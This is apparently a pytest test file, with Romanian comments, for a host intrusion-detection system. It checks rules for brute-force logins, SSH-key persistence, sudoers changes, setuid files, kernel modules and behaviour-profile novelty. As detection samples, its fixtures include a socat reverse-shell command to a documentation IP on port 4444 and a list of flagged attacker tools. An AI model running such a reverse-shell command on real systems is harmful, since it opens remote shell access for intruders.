"""Detecția post-compromitere și profilul de comportament.

Testul care contează cel mai mult e ultimul: un scenariu complet de intruziune,
pas cu pas, care verifică nu că fiecare regulă funcționează izolat, ci că
lanțul produce alerte la momentele în care un operator ar avea nevoie de ele.
"""
from __future__ import annotations

import asyncio
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest

from sentinel.detect import intrusion, novelty
from sentinel.detect.rules import RULES
from sentinel.predict import behaviour as bh

NOW = datetime(2026, 8, 6, 3, 14, tzinfo=timezone.utc)


def run(c):
    return asyncio.run(c)


class _DB:
    """Întoarce rânduri programate pe potrivire de text în SQL."""

    def __init__(self, rows=None, vals=None):
        self.rows, self.vals = rows or {}, vals or {}
        self.sql: list[str] = []
        self.args: list[tuple] = []

    def _pick(self, table, sql, default=None):
        for k, v in table.items():
            if k in sql:
                return v
        return default

    async def fetch(self, sql, *a):
        self.sql.append(sql)
        # Argumentele, nu doar textul. Interogarea e o constantă în modul, deci
        # o aserțiune pe textul ei trece chiar dacă apelantul nu mai cere
        # îngustarea — exact felul de test care pare să acopere ceva.
        self.args.append(a)
        v = self._pick(self.rows, sql, [])
        return v(*a) if callable(v) else v

    async def fetchrow(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.rows, sql)
        if isinstance(v, list):
            return v[0] if v else None
        return v

    async def fetchval(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.vals, sql, 0)
        return v(*a) if callable(v) else v

    async def execute(self, sql, *a):
        self.sql.append(sql)


def _row(**kw):
    base = {"action": "ssh_key_change", "n": 1, "paths": None, "procs": None,
            "users": None, "event_ids": [1], "first_ts": NOW, "last_ts": NOW,
            "sample": {}}
    base.update(kw)
    return base


# --- regulile de post-compromitere ----------------------------------------
def test_a_single_ssh_key_write_is_critical():
    """Fără prag de volum. O cheie scrisă în authorized_keys e acces care
    supraviețuiește schimbării parolei — a doua nu adaugă nimic la ce trebuie
    să știi."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", n=1, paths=["/root/.ssh/authorized_keys"],
        procs=["/usr/bin/tee"], users=["1000"])]})
    specs = run(intrusion.persistence(db, 0))
    assert len(specs) == 1
    assert specs[0].severity == "critical"
    assert "authorized_keys" in specs[0].summary


def test_intrusion_rules_never_produce_a_blockable_address():
    """Fapta e pe gazdă. Adresa care a scris cheia poate fi 127.0.0.1 sau poate
    lipsi; a bloca ceva pe baza ei ar însemna, în cel mai rău caz, să te
    blochezi pe tine."""
    db = _DB(rows={"e.source = 'auditd'": [_row(action="sudoers_change")]})
    for spec in run(intrusion.privilege_escalation(db, 0)):
        assert spec.src_ip is None
        assert spec.actor_key == "host"


def _bf_row(**kw):
    """Rândul pe care `_BRUTEFORCE_SQL` l-ar întoarce: cont + adresă,
    numărate separat, ca funcția să aleagă dovada corectă."""
    base = {
        "ip": "203.0.113.47", "username": "root", "geo_country": "DE",
        "geo_asn": 200651, "metoda": "password", "ok_id": 99, "ok_ts": NOW,
        "fails_cont": 0, "fails_ip": 0,
        "first_fail_cont": None, "first_fail_ip": None,
        "fail_ids_cont": [], "fail_ids_ip": [],
    }
    base.update(kw)
    return base


def test_a_successful_login_after_a_burst_of_failures_is_critical():
    """Restul motorului alertează pe cele 200 de încercări eșuate. Asta
    alertează pe a 201-a — singura care contează. Sute de eșecuri pe `root`
    urmate de o reușită pe `root`, cu parola: ESTE incident."""
    db = _DB(rows={"WITH ok AS": [_bf_row(
        fails_cont=214, fails_ip=214,
        first_fail_cont=NOW - timedelta(minutes=7),
        fail_ids_cont=[1, 2, 3])]})
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert len(specs) == 1
    s = specs[0]
    assert s.severity == "critical"
    assert "REUȘITĂ" in s.title
    assert "214" in s.summary
    assert s.evidence["fails_before"] == 214


def test_failures_on_other_accounts_do_not_taint_a_different_accounts_success():
    """Defectul reparat pe 30 august 2026, exact ca la `insights.posture`:
    trei refuzuri pe `dragos`, `deploy` și `admin`, apoi o reușită pe
    `sentinel-deploy` de pe ACEEAȘI adresă — alt cont, deci nimic spart. Nu e
    incident, fiindcă eșecurile de pe contul care a reușit sunt zero.

    `fails_ip=7` (peste `MIN_FAILS_BEFORE`) e ales anume: dacă regula ar mai
    citi eșecurile pe adresă în loc de cele pe cont, testul ăsta ar trece
    fals — un `fails_ip` sub prag n-ar fi deosebit cazul bun de cel reparat."""
    db = _DB(rows={"WITH ok AS": [_bf_row(
        username="sentinel-deploy",
        fails_cont=0,   # nimic pe `sentinel-deploy` însuși
        fails_ip=7)]})  # cele trei refuzuri există, dar pe alte conturi
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert specs == [], "eșecuri pe alt cont nu fac reușita suspectă"


def test_a_publickey_success_is_never_flagged_no_matter_how_many_failures():
    """O cheie nu se ghicește. Reușită pe `publickey` după oricâte eșecuri pe
    parolă de la aceeași adresă/cont: nu e o forțare care a mers."""
    db = _DB(rows={"WITH ok AS": [_bf_row(
        metoda="publickey", fails_cont=500, fails_ip=500)]})
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert specs == [], "publickey nu poate fi rezultatul unei ghiciri"


def test_a_reverse_shell_command_line_reaches_the_alert():
    """`socat` singur nu deosebește un reverse shell de un script de
    administrare. Argumentele o fac."""
    db = _DB(rows={"suspicious_exec": [{
        "id": 7, "ts": NOW, "process": "/usr/bin/socat", "username": "33",
        "raw": {"argv": "socat TCP:198.51.100.9:4444 EXEC:/bin/bash"}}]})
    specs = run(intrusion.attacker_tooling(db, 0))
    assert specs[0].severity == "critical"
    assert "4444" in specs[0].summary


def test_curl_is_high_not_critical():
    """Îl folosește toată lumea. Ridicat la critic ar face alerta despre socat
    să valoreze la fel de puțin."""
    db = _DB(rows={"suspicious_exec": [{
        "id": 8, "ts": NOW, "process": "/usr/bin/curl", "username": "33",
        "raw": {}}]})
    assert run(intrusion.attacker_tooling(db, 0))[0].severity == "high"


def test_webroot_tampering_asks_the_disambiguating_question():
    """Regula cu cel mai mare potențial de fals-pozitive din fișier. Textul
    trebuie să spună operatorului ce să verifice, nu doar ce s-a întâmplat."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="webroot_change", n=3, paths=["/var/www/html/x.php"])]})
    s = run(intrusion.webroot_tampering(db, 0))[0]
    assert s.severity == "high"
    assert "deploy" in s.summary.lower()


# --- profilul de comportament ---------------------------------------------
def _learning(dimension, *, days, obs, distinct, warm=None):
    """Vârsta se măsoară față de ceasul REAL, nu față de `NOW`.

    `_promote_warm` compară `started_at` cu `datetime.now()`, aşa cum trebuie —
    o dimensiune se încălzeşte în timp calendaristic. Construind `started_at`
    dintr-un `NOW` îngheţat, vârsta cazului „prea puţine zile" creştea cu o zi
    la fiecare zi care trecea de la scrierea testului. A trecut trei zile şi a
    început să pice, fără ca nimic din cod să se schimbe.

    Un test care depinde de ziua în care e rulat e mai rău decât niciunul: cade
    într-o zi în care nimeni nu a atins zona, iar prima reacţie e să fie crezut.
    """
    return {"started_at": datetime.now(timezone.utc) - timedelta(days=days),
            "observations": obs, "distinct_keys": distinct, "warm_at": warm}


def test_a_dimension_needs_both_days_and_observations():
    """ȘI, nu SAU. Numai zilele: un server oprit trei zile ar deveni cald fără
    să fi văzut nimic. Numai observațiile: o mie de autentificări într-o oră
    spun ce se întâmplă într-o oră, nu ce e normal marți dimineața."""
    dim = bh.BY_NAME["login_user"]
    cases = [
        (_learning("login_user", days=10, obs=5, distinct=3), False, "prea puține observații"),
        (_learning("login_user", days=0.5, obs=999, distinct=9), False, "prea puține zile"),
        (_learning("login_user", days=10, obs=999, distinct=1), False, "o singură cheie"),
        (_learning("login_user", days=10, obs=999, distinct=3), True, "ambele praguri"),
    ]
    for row, expect_warm, why in cases:
        db = _DB(rows={"FROM behaviour_learning": row})
        promoted = run(bh._promote_warm(db))
        assert (("login_user" in promoted) is expect_warm), why


def test_an_already_warm_dimension_is_not_re_promoted():
    """Persistat, nu recalculat: retenția taie observațiile vechi, iar o
    dimensiune caldă nu are voie să redevină rece — ar fi o a doua perioadă
    oarbă, exact când profilul e cel mai valoros."""
    db = _DB(rows={"FROM behaviour_learning":
                   _learning("login_user", days=99, obs=1, distinct=1, warm=NOW)})
    assert run(bh._promote_warm(db)) == []


def test_novelty_is_silent_while_the_dimension_is_learning():
    """Fără poarta asta, prima zi ar produce o alertă pentru fiecare utilizator,
    fiecare rețea și fiecare binar de pe server — adică sute, iar operatorul ar
    învăța din prima zi să ignore canalul."""
    db = _DB(vals={"warm_at IS NOT NULL": False},
             rows={"FROM behaviour_profiles": [
                 {"key": "atacator", "first_seen": NOW, "observations": 1}]})
    assert run(novelty.unseen_before(db, 0)) == []


def test_a_new_key_on_a_warm_dimension_alerts_once_per_key():
    db = _DB(vals={"warm_at IS NOT NULL": True, "count(*)": 4,
                   "EXTRACT(EPOCH": 21.0},
             rows={"FROM behaviour_profiles": [
                 {"key": "ro-backup", "first_seen": NOW, "observations": 1},
                 {"key": "svc-deploy", "first_seen": NOW, "observations": 1}]})
    specs = run(novelty.unseen_before(db, 0))
    prints = {s.fingerprint for s in specs}
    # Două valori noi = două incidente, nu unul actualizat.
    assert len(prints) == len(specs)
    assert any("ro-backup" in s.title for s in specs)


def test_acknowledged_keys_stop_alerting():
    """Marcarea e o decizie umană, vizibilă în tabelă. Un profil care ar învăța
    tăcut din propriile alerte ar putea fi antrenat de atacator."""
    sql_seen: list[str] = []

    class DB(_DB):
        async def fetch(self, sql, *a):
            sql_seen.append(sql)
            return []

    run(novelty._fresh_keys(DB(), "login_user"))
    assert any("acknowledged = false" in s for s in sql_seen)


# --- schimbarea bruscă de compoziție --------------------------------------
@pytest.mark.parametrize(
    "now_new,mean,buckets,expected,why",
    [
        (8, 0.1, 400, True,  "rafală față de o dimensiune liniștită"),
        (2, 0.1, 400, False, "sub minimul absolut, oricât de mare ar fi multiplul"),
        (8, 6.0, 400, False, "dimensiune care oricum descoperă chei noi des"),
        (8, 0.1, 5,   False, "prea puțin istoric ca media să însemne ceva"),
    ])
def test_composition_shift_thresholds(now_new, mean, buckets, expected, why):
    db = _DB(vals={"warm_at IS NOT NULL": True},
             rows={"WITH cur AS": {"now_new": now_new, "mean": mean,
                                   "buckets": buckets},
                   "FROM behaviour_profiles": []})
    specs = run(novelty.composition_shift(db, 0))
    assert bool(specs) is expected, why


# --- ordinea în motor -----------------------------------------------------
def test_learning_runs_before_the_rules_that_read_the_profile():
    """`observe()` scrie profilul; regulile citesc cheile pe care tocmai le-a
    creat. Inversat, o cheie ar fi ratată dacă serviciul cade între cei doi
    pași, sau re-alertată la nesfârșit dacă nu cade."""
    names = [r.__name__ for r in RULES]
    assert names.index("_learn") < names.index("unseen_before")
    assert names.index("_learn") < names.index("composition_shift")


def test_the_attempt_rules_still_run():
    """Post-compromiterea se ADAUGĂ, nu înlocuiește."""
    names = {r.__name__ for r in RULES}
    assert {"ssh_bruteforce", "web_enumeration", "suricata_alert",
            "volume_anomaly"} <= names


# --- scenariul complet ----------------------------------------------------
def test_a_full_intrusion_produces_alerts_at_each_stage():
    """Parola ghicită, cheie lăsată, privilegii luate, unealtă adusă.

    Testul nu verifică o regulă, ci că lanțul produce o alertă în fiecare
    moment în care operatorul ar avea nevoie de una. Înainte, singura alertă din
    toată secvența era pentru încercările EȘUATE de la început."""
    stages = []

    # 1. a intrat
    db = _DB(rows={"WITH ok AS": [_bf_row(
        username="deploy", geo_country="RU", geo_asn=12345,
        ok_id=1, fails_cont=180, fails_ip=180,
        first_fail_cont=NOW - timedelta(minutes=9), fail_ids_cont=[1])]})
    stages += run(intrusion.successful_login_after_bruteforce(db, 0))

    # 2. și-a lăsat cheia
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", paths=["/root/.ssh/authorized_keys"])]})
    stages += run(intrusion.persistence(db, 0))

    # 3. și-a luat root
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="sudoers_change", paths=["/etc/sudoers.d/x"])]})
    stages += run(intrusion.privilege_escalation(db, 0))

    # 4. și-a adus unealta
    db = _DB(rows={"suspicious_exec": [{
        "id": 4, "ts": NOW, "process": "/usr/bin/socat", "username": "0",
        "raw": {"argv": "socat TCP:198.51.100.9:4444 EXEC:/bin/bash"}}]})
    stages += run(intrusion.attacker_tooling(db, 0))

    assert len(stages) == 4, "fiecare etapă trebuie să producă o alertă"
    assert all(s.severity == "critical" for s in stages)
    # Amprente distincte: patru incidente separate, nu unul actualizat de patru
    # ori. Operatorul trebuie să vadă progresia, nu ultima stare.
    assert len({s.fingerprint for s in stages}) == 4


# --- ce am învățat din 851 de incidente reale ------------------------------
#
# Serverul a produs, în șapte zile, incidente `high` intitulate „Unealtă de
# atacator executată: install / chmod / logrotate / sefcontext_compile", plus
# un „chei SSH modificate" cu 62 de detecții. Niciunul nu era ce spunea că e.
# Testele de aici descriu cele patru cauze, în ordinea în care se compuneau.

@pytest.mark.parametrize("binar", ["install", "chmod", "logrotate",
                                   "sefcontext_compile", "sed", "python3"])
def test_ordinary_binaries_are_not_attacker_tools(binar):
    """Regula avea `TOOL_WEIGHT.get(name, "high")`.

    Orice binar necunoscut primea severitate ridicată și titlul „Unealtă de
    atacator executată". `install` și `chmod` sunt utilitare pe care le rulează
    orice instalare — inclusiv a noastră. O regulă al cărei mod de eșec e să
    strige „lupul" nu are voie să aibă o valoare implicită permisivă.
    """
    db = _DB(rows={"suspicious_exec": [{
        "id": 1, "ts": NOW, "process": f"/usr/bin/{binar}",
        "username": "1000", "raw": {}}]})
    assert run(intrusion.attacker_tooling(db, 0)) == []


def test_the_tools_it_does_know_still_fire():
    """Îngustarea nu are voie să stingă semnalul pentru care există regula."""
    db = _DB(rows={"suspicious_exec": [
        {"id": 1, "ts": NOW, "process": "/usr/bin/ncat", "username": "1000", "raw": {}},
        {"id": 2, "ts": NOW, "process": "/usr/bin/wget", "username": "1000", "raw": {}},
    ]})
    specs = run(intrusion.attacker_tooling(db, 0))
    assert {s.evidence["tool"] for s in specs} == {"ncat", "wget"}


def test_ssh_watch_is_narrowed_to_ssh_paths_in_sql():
    """`-w /home` prinde tot ce scrie oricine în directorul lui.

    Nucleul nu cunoaște globuri, deci nu are cum să urmărească doar
    /home/*/.ssh/. Îngustarea trebuie să existe în interogare — dacă ar fi
    făcută după grupare, numărul de evenimente ar rămâne umflat cu scrierile
    irelevante chiar dacă titlul ar arăta corect.
    """
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", n=1, paths=["/root/.ssh/authorized_keys"])]})
    run(intrusion.persistence(db, 0))

    assert "e.action <> $4::text" in db.sql[0]
    # Interogarea o suportă; aserțiunea care contează e că APELANTUL o cere.
    narrow_action, narrow_paths = db.args[0][3], db.args[0][4]
    assert narrow_action == "ssh_key_change"
    assert narrow_paths, "regula nu trimite tiparele de cale"
    # Și numai acțiunea aceea e îngustată: /etc/crontab și /etc/systemd/system
    # sunt deja exact ce ne interesează.
    assert all("ssh" in t or "authorized_keys" in t for t in narrow_paths)


def test_the_collector_and_the_sql_gate_share_one_definition_of_an_ssh_path():
    """Îngustarea se face acum în două locuri: la clasificare, în colector, și
    în interogare, pentru rândurile deja scrise sub eticheta veche. Cu două
    liste separate ar diverge la prima modificare, iar divergența s-ar vedea ca
    un fals-negativ tăcut — o cheie SSH scrisă și neraportată."""
    from sentinel.collectors.auditd import SSH_PATH_LIKE, looks_like_ssh_path

    assert intrusion.SSH_PATHS is SSH_PATH_LIKE
    # Și că predicatul din Python chiar înseamnă ce înseamnă tiparele LIKE.
    for path in ("/home/x/.ssh/authorized_keys", "/home/x/.ssh",
                 "/etc/ssh/sshd_config", "/root/.ssh/id_rsa"):
        assert looks_like_ssh_path(path), path
    for path in ("/home/deploy/=", "/home/deploy/rotateCount",
                 "/home/x/.bash_history", "/var/www/html/x.php"):
        assert not looks_like_ssh_path(path), path


# --- garda pe forma evidenței (incidentul 4268) ----------------------------
def _pathless_spec(**kw):
    from sentinel.detect.spec import DetectionSpec

    base = dict(
        rule_id="intrusion.persistence.ssh_key_change", rule_family="intrusion",
        severity="critical", src_ip=None, actor_key="host",
        fingerprint="intrusion.persistence.ssh_key_change:ssh_key_change",
        title="Mecanism de persistență modificat: chei SSH sau configurație",
        summary="6 modificări în 10 min", event_ids=[1], path_backed=True,
        # Evidența exactă a incidentului 4268.
        evidence={"auid": ["1000"], "count": 6, "paths": ["=", "rotateCount"],
                  "processes": ["/usr/bin/bash"], "window_min": 10})
    base.update(kw)
    return DetectionSpec(**base)


def test_a_detection_that_cannot_name_a_file_is_not_critical():
    """`=` și `rotateCount` nu sunt căi de fișier.

    Un critic fals repetat de zeci de ori face mai mult rău decât unul lipsă:
    operatorul încetează să citească toate celelalte. O regulă al cărei titlu
    spune „fișierul X s-a modificat" și care nu poate arăta niciun X nu susține
    ce afirmă.
    """
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec())
    assert s.severity != "critical"
    assert s.evidence["evidence_guard"] == "no_plausible_path"
    assert s.evidence["severity_claimed"] == "critical"


def test_a_degraded_detection_is_still_above_the_notification_floor():
    """Degradarea nu are voie să însemne tăcere.

    Botul e singurul consumator al alertelor și citește `unnotified()` cu pragul
    din `telegram.min_severity`. Coborâtă sub el, o detecție degradată nu ar
    ajunge niciodată la operator — iar `medium` e, pe gazda asta, o coadă cu 433
    de incidente deschise și 422 nenotificate. Un `chmod u+s` nimerit peste o
    graniță de citire produce un eveniment fără cale, deci ajunge exact aici.
    """
    from sentinel.config import TelegramConfig
    from sentinel.constants import SEVERITIES
    from sentinel.detect.spec import UNSUPPORTED_SEVERITY

    rank = SEVERITIES.index
    assert rank(UNSUPPORTED_SEVERITY) >= rank(TelegramConfig.min_severity), (
        "severitatea degradată e sub pragul de notificare livrat: garda ar fi "
        "suprimare, nu degradare")
    # Și cea mai de sus treaptă care nu e `critical`: mai jos ar fi o alegere
    # despre cât de tare vrem să nu deranjăm, nu despre ce știm.
    assert SEVERITIES[rank(UNSUPPORTED_SEVERITY) + 1] == "critical"


def test_the_degraded_detection_is_still_written_and_says_why():
    """Garda nu are voie să ascundă un colector stricat.

    O alertă care dispare în tăcere ar face invizibilă exact cauza care a
    produs zgomotul. Detecția rămâne, cu motivul în evidență și cu un titlu
    care spune ce se știe de fapt.
    """
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec())
    assert "fără cale" in s.title
    assert "auditd" in s.summary
    # Amprentă separată: altfel detecțiile degradate s-ar aduna în incidentul
    # critic real și i-ar umfla contorul — fix simptomul „62 de detecții".
    assert s.fingerprint != _pathless_spec().fingerprint


def test_one_real_path_is_enough_to_keep_the_severity():
    """Îngustarea nu are voie să stingă semnalul pentru care există regula. O
    scriere reală în authorized_keys rămâne critică chiar dacă lângă ea, în
    aceeași fereastră, a nimerit și un token fără sens."""
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec(
        evidence={"paths": ["=", "/root/.ssh/authorized_keys"]}))
    assert s.severity == "critical"
    assert "fără cale" not in s.title
    assert "evidence_guard" not in s.evidence


def test_a_rule_that_never_promised_a_path_is_left_alone():
    """`init_module` nu are înregistrare PATH și textul alertei nu promite una.
    O gardă pornită implicit ar retrograda tăcut încărcarea unui modul de
    kernel — sub care nu mai există nimic care să observe."""
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec(path_backed=False, evidence={"paths": []}))
    assert s.severity == "critical"

    # Și că regula chiar se declară așa.
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="module_load", n=1, procs=["/usr/sbin/insmod"])]})
    assert run(intrusion.module_load(db, 0))[0].path_backed is False


def test_the_path_rules_declare_themselves_path_backed():
    """O regulă pe fișier care nu se declară așa ocolește garda în tăcere."""
    cases = {
        "ssh_key_change": intrusion.persistence,
        "sudoers_change": intrusion.privilege_escalation,
        "webroot_change": intrusion.webroot_tampering,
        "suid_change": intrusion.suid_change,
    }
    for action, rule in cases.items():
        db = _DB(rows={"e.source = 'auditd'": [_row(action=action, paths=["/etc/x"])]})
        specs = run(rule(db, 0))
        assert specs and specs[0].path_backed, action


def test_the_engine_applies_the_guard_before_writing_the_detection(monkeypatch):
    """Garda trăiește în motor, nu în fiecare regulă.

    Pusă în reguli, o regulă nouă ar putea să o uite, iar uitarea s-ar vedea
    abia ca un critic fals în telefonul operatorului.
    """
    from sentinel.db.repo import incidents as inc_repo
    from sentinel.detect import engine
    from sentinel.respond import decider

    seen: dict = {}

    async def _false(*a, **kw):
        return False

    async def _none(*a, **kw):
        return None

    async def _record(db, **kw):
        seen.update(kw)
        return 1

    async def _upsert_incident(db, **kw):
        seen["incident_severity"] = kw["severity"]
        return 7, True

    async def _consider(*a, **kw):
        return "observed"

    monkeypatch.setattr(inc_repo, "actor_is_allowlisted", _false)
    monkeypatch.setattr(inc_repo, "upsert_actor", _none)
    monkeypatch.setattr(inc_repo, "record_detection", _record)
    monkeypatch.setattr(inc_repo, "upsert_incident", _upsert_incident)
    monkeypatch.setattr(inc_repo, "link_detection", _none)
    monkeypatch.setattr(inc_repo, "add_timeline", _none)
    monkeypatch.setattr(decider, "consider", _consider)

    cfg = SimpleNamespace(detection=SimpleNamespace(enabled=True))
    run(engine._apply(_DB(), cfg, _pathless_spec()))
    from sentinel.detect.spec import UNSUPPORTED_SEVERITY

    assert seen["severity"] == UNSUPPORTED_SEVERITY != "critical"
    assert seen["incident_severity"] == UNSUPPORTED_SEVERITY


def test_setuid_gets_its_own_rule_naming_the_file():
    """Semnalul exista, dar împărțea cheia de audit cu uneltele de rețea.

    Ajungea în regula de tooling și era raportat ca „unealtă de atacator
    executată: chmod". Întrebarea care conta — CE fișier a devenit setuid — nu
    apărea nicăieri.
    """
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="suid_change", n=1, paths=["/tmp/.hidden/rootshell"],
        procs=["/usr/bin/chmod"], users=["1000"])]})
    s = run(intrusion.suid_change(db, 0))[0]
    assert s.severity == "critical"
    assert "/tmp/.hidden/rootshell" in s.summary
    assert "unealt" not in s.title.lower()


def test_module_load_is_its_own_rule():
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="module_load", n=1, procs=["/usr/sbin/insmod"], users=["1000"])]})
    s = run(intrusion.module_load(db, 0))[0]
    assert s.severity == "critical"
    assert "kernel" in s.title.lower()


def test_every_intrusion_rule_is_registered():
    """O regulă scrisă și neînregistrată nu rulează niciodată, în tăcere."""
    import inspect
    defined = {n for n, f in vars(intrusion).items()
               if inspect.iscoroutinefunction(f) and not n.startswith("_")}
    registered = {f.__name__ for f in intrusion.INTRUSION_RULES}
    assert defined == registered, f"neînregistrate: {defined - registered}"
